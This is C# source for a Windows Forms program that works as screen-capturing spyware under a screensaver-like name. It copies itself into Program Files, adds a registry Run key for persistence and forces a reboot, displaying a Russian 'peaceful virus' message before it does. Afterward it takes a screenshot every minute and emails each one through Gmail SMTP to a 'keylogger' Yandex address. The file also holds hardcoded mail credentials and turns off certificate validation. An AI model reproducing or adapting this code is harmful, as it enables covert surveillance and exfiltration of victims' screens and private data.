﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;
using System.IO;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
namespace WindowsFormsApp5
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(finalDir))
                {
                    Directory.CreateDirectory(finalDir);
                    Directory.CreateDirectory(finalDir + @"Screens\");
                    File.Copy(Application.ExecutablePath, finalDir + "soft.exe");
                    const string name = "SoftWare";
                    string ExePath = finalDir + "soft.exe";
                    RegistryKey reg;
                    reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
                    try
                    {
                        reg.SetValue(name, ExePath);
                        reg.Close();
                    }
                    catch
                    {
                        MessageBox.Show("");
                    }

                    MessageBox.Show("Я мирный хохляций вирус. Пожалуйста, удали 1 какой-нибудь файл на своем компьтере. Ты больше не увидишь это сообщение.");
                    Process.Start("cmd", @"/C shutdown /r");
                    Application.Exit();
                }
                else
                {
                    Thread.Sleep(60000);
                    Cir.Start();
                    foreach (string way in Directory.GetFiles(wayToDir))
                        File.Delete(way);
                    Thread.Sleep(2592000);
                }
            }
            catch { }
        }

        static string wayToDir = @"Screens\";
        static string wayToScreen;
        static string finalDir = @"C:\Program Files (x86)\ScreenSaver\";
        Thread Cir = new Thread(Circle);

        static private void Send()
        {

            MailAddress from = new MailAddress("lll.a.qp.o.b.o.d@gmail.com", "Idmar");
            MailAddress to = new MailAddress("keylogger.idmar@yandex.ru");
            MailMessage m = new MailMessage(from, to);
            m.Subject = "Снимок экрана";
            m.Body = "";
            m.IsBodyHtml = true;
            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587); ;
            smtp.Credentials = new NetworkCredential("lll.a.qp.o.b.o.d@gmail.com", "qaEDtgUJol");
            smtp.EnableSsl = true;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            m.Attachments.Add(new Attachment(wayToScreen));
            // Thread.Sleep(10000);

            try
            {
                smtp.Send(m);
            }
            catch { }
        }

        static private void MakeScreen()
        {
            Bitmap BM = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics GH = Graphics.FromImage(BM as Image);
            GH.CopyFromScreen(0, 0, 0, 0, BM.Size);
            if (!Directory.Exists(wayToDir))
                Directory.CreateDirectory(wayToDir);
            wayToScreen = wayToDir + System.DateTime.Now.ToString().Replace(':', '_')+".bmp";
            BM.Save(wayToScreen);




        }

        static private void DeleteScreen()
        {

            File.Delete(wayToScreen);
        }


        static private void Circle()
        {
            while (true)
            {
                MakeScreen();
                Send();
                //DeleteScreen();
                //MessageBox.Show("Succ");
                Thread.Sleep(1000*60);

            }
        }

        private void button1_Click(object sender, EventArgs e)
        {

        }
    }
}

